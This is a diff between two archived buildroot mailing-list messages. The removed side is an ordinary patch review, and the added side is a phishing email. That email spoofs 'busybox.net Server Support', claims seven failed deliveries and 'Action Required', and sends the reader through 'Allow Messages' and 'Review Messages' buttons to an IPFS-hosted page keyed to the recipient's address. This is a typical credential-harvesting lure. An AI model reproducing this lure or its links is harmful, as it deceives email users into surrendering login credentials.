@@ -4,74 +4,48 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from smtp3.osuosl.org (smtp3.osuosl.org [140.211.166.136])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id 65AF5CD342B
-	for <buildroot@archiver.kernel.org>; Mon,  2 Sep 2024 00:27:05 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id 396D4C54FC6
+	for <buildroot@archiver.kernel.org>; Mon,  2 Sep 2024 03:35:41 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 15549605D2;
-	Mon,  2 Sep 2024 00:27:05 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id A1AF4605E4;
+	Mon,  2 Sep 2024 03:35:41 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
 Received: from smtp3.osuosl.org ([127.0.0.1])
  by localhost (smtp3.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id 69Oemvqha7cH; Mon,  2 Sep 2024 00:27:04 +0000 (UTC)
+ id OQfb7lHkVIjX; Mon,  2 Sep 2024 03:35:40 +0000 (UTC)
 X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 2FB076068A
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp3.osuosl.org 955B5607A4
 Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
-	by smtp3.osuosl.org (Postfix) with ESMTP id 2FB076068A;
-	Mon,  2 Sep 2024 00:27:04 +0000 (UTC)
-Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
- by ash.osuosl.org (Postfix) with ESMTP id 1E7CB1BF86B
- for <buildroot@lists.busybox.net>; Mon,  2 Sep 2024 00:27:03 +0000 (UTC)
+	by smtp3.osuosl.org (Postfix) with ESMTP id 955B5607A4;
+	Mon,  2 Sep 2024 03:35:40 +0000 (UTC)
+Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
+ by ash.osuosl.org (Postfix) with ESMTP id 4AAF11BF8A8
+ for <buildroot@lists.busybox.net>; Mon,  2 Sep 2024 03:35:39 +0000 (UTC)
 Received: from localhost (localhost [127.0.0.1])
- by smtp4.osuosl.org (Postfix) with ESMTP id 0B41C40309
- for <buildroot@lists.busybox.net>; Mon,  2 Sep 2024 00:27:03 +0000 (UTC)
+ by smtp1.osuosl.org (Postfix) with ESMTP id 36FF680FF5
+ for <buildroot@lists.busybox.net>; Mon,  2 Sep 2024 03:35:39 +0000 (UTC)
 X-Virus-Scanned: amavis at osuosl.org
-Received: from smtp4.osuosl.org ([127.0.0.1])
- by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
- id e8UNQYLv_CWo for <buildroot@lists.busybox.net>;
- Mon,  2 Sep 2024 00:27:02 +0000 (UTC)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=147.75.193.91;
- helo=nyc.source.kernel.org; envelope-from=dlemoal@kernel.org;
+Received: from smtp1.osuosl.org ([127.0.0.1])
+ by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
+ id jGeGOlXfUXRX for <buildroot@lists.busybox.net>;
+ Mon,  2 Sep 2024 03:35:38 +0000 (UTC)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=141.98.10.116;
+ helo=busybox.net; envelope-from=postmaster.support@busybox.net;
  receiver=<UNKNOWN> 
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp4.osuosl.org 445A7402C4
-DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 445A7402C4
-Received: from nyc.source.kernel.org (nyc.source.kernel.org [147.75.193.91])
- by smtp4.osuosl.org (Postfix) with ESMTPS id 445A7402C4
- for <buildroot@buildroot.org>; Mon,  2 Sep 2024 00:27:02 +0000 (UTC)
-Received: from smtp.kernel.org (transwarp.subspace.kernel.org [100.75.92.58])
- by nyc.source.kernel.org (Postfix) with ESMTP id 5C0ACA4154D;
- Mon,  2 Sep 2024 00:26:53 +0000 (UTC)
-Received: by smtp.kernel.org (Postfix) with ESMTPSA id 6CC52C4CEC3;
- Mon,  2 Sep 2024 00:26:59 +0000 (UTC)
-Message-ID: <b9933aa5-36f8-467e-b257-f3dec64dbd26@kernel.org>
-Date: Mon, 2 Sep 2024 09:26:58 +0900
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 6852C80FBC
+DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 6852C80FBC
+Received: from busybox.net (unknown [141.98.10.116])
+ by smtp1.osuosl.org (Postfix) with ESMTP id 6852C80FBC
+ for <buildroot@busybox.net>; Mon,  2 Sep 2024 03:35:36 +0000 (UTC)
+From: busybox.net Server Support <postmaster.support@busybox.net>
+To: buildroot@busybox.net
+Date: 2 Sep 2024 05:35:33 +0200
+Message-ID: <20240902053532.2D6B932FC93CAEF9@busybox.net>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-To: Dario Binacchi <dario.binacchi@amarulasolutions.com>,
- buildroot@buildroot.org
-References: <20240831120833.2915529-1-dario.binacchi@amarulasolutions.com>
- <20240831120833.2915529-4-dario.binacchi@amarulasolutions.com>
-Content-Language: en-US
-Organization: Western Digital Research
-In-Reply-To: <20240831120833.2915529-4-dario.binacchi@amarulasolutions.com>
-X-Mailman-Original-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple;
- d=kernel.org; s=k20201202; t=1725236820;
- bh=BmrASTMbTuuKA39GotAR/39kQ5trvj5w2LXeYBD16uc=;
- h=Date:Subject:To:Cc:References:From:In-Reply-To:From;
- b=PXGb9hoLGczHf2HCM4gGLyENDoj5zQMlnAGxx25Qf/qe56OhJn8iRKmyA9jU/bg1t
- glW6mloFp0eO0g8YRAHLeud2wcVC/6gnxkNYV16p8rjf/leufKRPRit0bGmHi5vEj8
- /Q03JTEmz/g61+EbK3xntrsN5ZDxMha04ftEiUOeVJ3Cs7vdwKk36OLHAi4J7Hfdz+
- zjaNcs+9Pck/LJGweoKb+lU2VquYzUit/fUl0nDOG5sFsdfryVTYBqenMKsrnS9x/I
- UlHLeeo/9r0G1pqRpItHhO2JEtv+izNaacU1wokRw9Q89f60zmjFY7CuxJnMqJ3KL9
- 6kffyIcxiqKkA==
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dmarc=pass (p=quarantine dis=none)
- header.from=kernel.org
-X-Mailman-Original-Authentication-Results: smtp4.osuosl.org;
- dkim=pass (2048-bit key,
- unprotected) header.d=kernel.org header.i=@kernel.org header.a=rsa-sha256
- header.s=k20201202 header.b=PXGb9hoL
-Subject: Re: [Buildroot] [PATCH v4 3/3] board/canaan/k210-soc: use tinyinit
- as Linux init process
+X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
+ dmarc=none (p=none dis=none)
+ header.from=busybox.net
+Subject: [Buildroot] Notification | You have (7) failed email deliveries
 X-BeenThere: buildroot@buildroot.org
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -83,35 +57,228 @@ List-Post: <mailto:buildroot@buildroot.org>
 List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
 List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
  <mailto:buildroot-request@buildroot.org?subject=subscribe>
-From: Damien Le Moal via buildroot <buildroot@buildroot.org>
-Reply-To: Damien Le Moal <dlemoal@kernel.org>
-Cc: linux-amarula@amarulasolutions.com,
- "Yann E . MORIN" <yann.morin.1998@free.fr>,
- Thomas Petazzoni <thomas.petazzoni@bootlin.com>
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============8248894055336554150=="
 Errors-To: buildroot-bounces@buildroot.org
 Sender: "buildroot" <buildroot-bounces@buildroot.org>
 
-On 8/31/24 21:08, Dario Binacchi wrote:
-> The initialization script provided by the tinyinit package is the same
-> as the one contained in board/canaan/k210-soc/rootfs_overlay/sbin/init
-> except for the Linux logo, which has been removed. The patch reworks
-> the configurations that use this overlay directory by replacing the
-> initialization process contained within it with the one provided by
-> the tinyinit package.
-> 
-> Signed-off-by: Dario Binacchi <dario.binacchi@amarulasolutions.com>
+--===============8248894055336554150==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
 
-Looks good.
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
 
-Reviewed-by: Damien Le Moal <dlemoal@kernel.org>
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;">
+<p>
+<table width=3D"548" style=3D"border-color: rgb(221, 221, 221); color: blac=
+k; text-transform: none; text-indent: 0px; letter-spacing: normal; padding-=
+top: 0px; padding-bottom: 0px; font-family: Arial, Helvetica, sans-serif; f=
+ont-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; w=
+hite-space: normal; border-collapse: collapse; max-width: 548px; border-spa=
+cing: 0px; orphans: 2; widows: 2; font-variant-ligatures: normal; font-vari=
+ant-caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">=
 
--- 
-Damien Le Moal
-Western Digital Research
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding-top: 10=
+px; padding-bottom: 4px; font-family: "Segoe UI", Frutiger, Arial, sans-ser=
+if; font-size: 14px; box-sizing: border-box;'>&nbsp;</td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; padding-right: =
+0px; padding-bottom: 15px; padding-left: 0px; font-family: Roboto, RobotoDr=
+aft, Helvetica, Arial, sans-serif; box-sizing: border-box; border-spacing: =
+0px;">
+<table style=3D"border-color: rgb(221, 221, 221); padding-top: 0px; padding=
+-bottom: 0px; font-weight: 600; border-collapse: collapse; max-width: 548px=
+; border-spacing: 0px;">
+<tbody style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">=
+
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; width: 181px; f=
+ont-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 15px; verti=
+cal-align: bottom; box-sizing: border-box;'>
+<font color=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); box-sizi=
+ng: border-box;"><span style=3D"border-color: rgb(221, 221, 221); color: rg=
+b(0, 0, 0); box-sizing: border-box;">Failure Notice</span></font></td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; width: 186px; t=
+ext-align: center; font-family: "Segoe UI", Frutiger, Arial, sans-serif; fo=
+nt-size: 15px; vertical-align: bottom; box-sizing: border-box;'>
+<font color=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); box-sizi=
+ng: border-box;"><span style=3D"border-color: rgb(221, 221, 221); color: rg=
+b(0, 0, 0); box-sizing: border-box;">
+<a style=3D"border-color: rgb(221, 221, 221); color: rgb(34, 34, 34); box-s=
+izing: border-box; background-color: transparent;" target=3D"_blank">busybo=
+x.net</a></span></font></td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; width: 181px; t=
+ext-align: right; font-family: "Segoe UI", Frutiger, Arial, sans-serif; fon=
+t-size: 15px; vertical-align: bottom; box-sizing: border-box;'>buildroot<br=
+></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; width: 181px; p=
+adding-top: 0px; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Ar=
+ial, sans-serif; font-size: 14px; font-weight: 400; vertical-align: middle;=
+ box-sizing: border-box;'>
+<font color=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); box-sizi=
+ng: border-box;"><span style=3D"border-color: rgb(221, 221, 221); color: rg=
+b(192, 0, 0); box-sizing: border-box;">
+<span style=3D"border-color: rgb(221, 221, 221); font-weight: bolder; box-s=
+izing: border-box;">Action Required</span></span></font></td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; width: 186px; t=
+ext-align: center; padding-top: 0px; padding-bottom: 0px; font-family: "Seg=
+oe UI", Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; ver=
+tical-align: middle; box-sizing: border-box;'>&nbsp;</td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; width: 181px; t=
+ext-align: right; padding-top: 0px; padding-bottom: 0px; font-family: "Sego=
+e UI", Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; vert=
+ical-align: middle; box-sizing: border-box;'>
+<font color=3D"#ffffff" style=3D"border-color: rgb(221, 221, 221); box-sizi=
+ng: border-box;"><span style=3D"border-color: rgb(221, 221, 221); color: rg=
+b(0, 0, 0); box-sizing: border-box;">Recipient</span></font></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
+ox-sizing: border-box;" colspan=3D"3">
+<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; border-coll=
+apse: collapse; border-spacing: 0px;" cellspacing=3D"0" cellpadding=3D"0">
+<tbody style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">=
+
+<tr height=3D"10" style=3D"border-color: rgb(221, 221, 221); box-sizing: bo=
+rder-box;">
+<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
+margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
+ont-size: 6px; box-sizing: border-box;" bgcolor=3D"#c00000">&nbsp;</td>
+<td width=3D"4" height=3D"10" style=3D"border-color: rgb(221, 221, 221); ma=
+rgin: 0px; padding: 0px; width: 4px; height: 10px; line-height: 10px; font-=
+size: 6px; box-sizing: border-box;" bgcolor=3D"#ffffff">&nbsp;</td>
+<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
+margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
+ont-size: 6px; box-sizing: border-box;" bgcolor=3D"#cccccc">&nbsp;</td>
+<td width=3D"4" height=3D"10" style=3D"border-color: rgb(221, 221, 221); ma=
+rgin: 0px; padding: 0px; width: 4px; height: 10px; line-height: 10px; font-=
+size: 6px; box-sizing: border-box;" bgcolor=3D"#ffffff">&nbsp;</td>
+<td width=3D"180" height=3D"10" style=3D"border-color: rgb(221, 221, 221); =
+margin: 0px; padding: 0px; width: 180px; height: 10px; line-height: 10px; f=
+ont-size: 6px; box-sizing: border-box;" bgcolor=3D"#cccccc">&nbsp;</td></tr=
+></tbody></table></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; w=
+idth: 181px; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, s=
+ans-serif; font-size: 14px; font-weight: 400; box-sizing: border-box;'>&nbs=
+p;</td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; w=
+idth: 186px; text-align: center; line-height: 20px; font-family: "Segoe UI"=
+, Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; box-sizin=
+g: border-box;'>&nbsp;</td>
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; w=
+idth: 181px; text-align: right; line-height: 20px; font-family: "Segoe UI",=
+ Frutiger, Arial, sans-serif; font-size: 14px; font-weight: 400; box-sizing=
+: border-box;'>&nbsp;</td></tr></tbody></table></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; width: 528px; p=
+adding-top: 0px; padding-right: 10px; padding-left: 10px; font-family: Robo=
+to, RobotoDraft, Helvetica, Arial, sans-serif; box-sizing: border-box;">&nb=
+sp;
+<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; width: 528p=
+x; margin-left: 0px; border-collapse: collapse; background-color: rgb(242, =
+245, 250);">
+<tbody style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">=
+
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 21px; =
+box-sizing: border-box;'>
+<table style=3D"border-color: rgb(221, 221, 221); padding: 0px; width: 528p=
+x; margin-left: 0px; border-collapse: collapse;">
+<tbody style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">=
+
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px; font-family: "segoe ui", frutiger, arial, sans-serif; box-sizing: borde=
+r-box;'>
+<div style=3D"border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; =
+font-family: inherit; font-size: 15px; vertical-align: baseline; border-top=
+-width: 0px; box-sizing: border-box;">
+<span style=3D"border-color: rgb(221, 221, 221); font-weight: bolder; box-s=
+izing: border-box;">Message Failure&nbsp;Receiving Notice.</span><br style=
+=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+ATTENTION:&nbsp;<a style=3D"border-color: rgb(221, 221, 221); color: rgb(34=
+, 34, 34); box-sizing: border-box; background-color: transparent;" target=
+=3D"_blank">buildroot@busybox.net</a></div></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px 6px; font-family: "segoe ui", frutiger, arial, sans-serif; font-size: 16=
+px; box-sizing: border-box;'>
+<div style=3D"border-color: rgb(221, 221, 221); padding-top: 0px; border-to=
+p-width: 0px; box-sizing: border-box;">You have Suspended incoming message<=
+br style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">Plea=
+se Fix Below&nbsp;</div></td></tr></tbody>
+</table>
+<div style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">&n=
+bsp;</div>
+<div style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<a style=3D"background: rgb(38, 117, 214); border-color: rgb(221, 221, 221)=
+; margin: 2px; padding: 10px; color: rgb(255, 255, 255); font-size: 14px; t=
+ext-decoration: underline; float: left; display: block; outline-width: 0px;=
+ outline-style: none; box-sizing: border-box; text-decoration-line: none;" =
+href=3D"https://ipfs.io/ipfs/bafkreieoagoghvhs6zjedi37nhf5ydjmb25vg7m4xlhcb=
+pv3xdgmtbbca4?filename=3DHasides.html#buildroot@busybox.net" target=3D"_bla=
+nk" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmSrFsFDsSN6vYqfcJ6yuUJSBkANNmPHR3ecGHMa6WFoZS%23%5B%5B-Email-=
+%5D%5D&amp;source=3Dgmail&amp;ust=3D1707901370967000&amp;usg=3DAOvVaw0oDoPR=
+FiidHdHkLjt6uRx8">Allow Messages</a>
+<a style=3D"background: rgb(219, 214, 214); border-color: rgb(221, 221, 221=
+); margin: 2px; padding: 10px; color: rgb(12, 12, 12); font-size: 14px; tex=
+t-decoration: underline; float: left; display: block; outline-width: 0px; o=
+utline-style: none; box-sizing: border-box; text-decoration-line: none;" hr=
+ef=3D"https://ipfs.io/ipfs/bafkreieoagoghvhs6zjedi37nhf5ydjmb25vg7m4xlhcbpv=
+3xdgmtbbca4?filename=3DHasides.html#buildroot@busybox.net" target=3D"_blank=
+" rel=3D"noreferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://cloudflare-i=
+pfs.com/ipfs/QmSrFsFDsSN6vYqfcJ6yuUJSBkANNmPHR3ecGHMa6WFoZS%23%5B%5B-Email-=
+%5D%5D&amp;source=3Dgmail&amp;ust=3D1707901370967000&amp;usg=3DAOvVaw0oDoPR=
+FiidHdHkLjt6uRx8">Review Messages</a></div>
+<div style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;"><b=
+r style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">&nbsp=
+;</div></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 16=
+px; box-sizing: border-box;'>&nbsp;</td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D"border-color: rgb(221, 221, 221); margin: 0px; padding: 0px; b=
+ox-sizing: border-box; border-spacing: 0px;">
+<p style=3D"border-color: rgb(221, 221, 221); margin-top: 0px; margin-left:=
+ 15px; box-sizing: border-box;">
+<a style=3D'border-color: rgb(221, 221, 221); text-align: center; color: rg=
+b(34, 34, 34); font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-s=
+ize: 15px; box-sizing: border-box; background-color: rgb(255, 255, 255);' t=
+arget=3D"_blank">busybox.net</a>&nbsp;Notification</p></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding: 0px 10=
+px 6px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 16=
+px; box-sizing: border-box;'>&nbsp;</td></tr></tbody></table></td></tr>
+<tr style=3D"border-color: rgb(221, 221, 221); box-sizing: border-box;">
+<td style=3D'border-color: rgb(221, 221, 221); margin: 0px; padding-top: 10=
+px; padding-bottom: 4px; font-family: "Segoe UI", Frutiger, Arial, sans-ser=
+if; font-size: 14px; box-sizing: border-box;'>&nbsp;</td></tr></tbody></tab=
+le><p></p></body></html>
+
+--===============8248894055336554150==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 buildroot mailing list
 buildroot@buildroot.org
 https://lists.buildroot.org/mailman/listinfo/buildroot
+
+--===============8248894055336554150==--
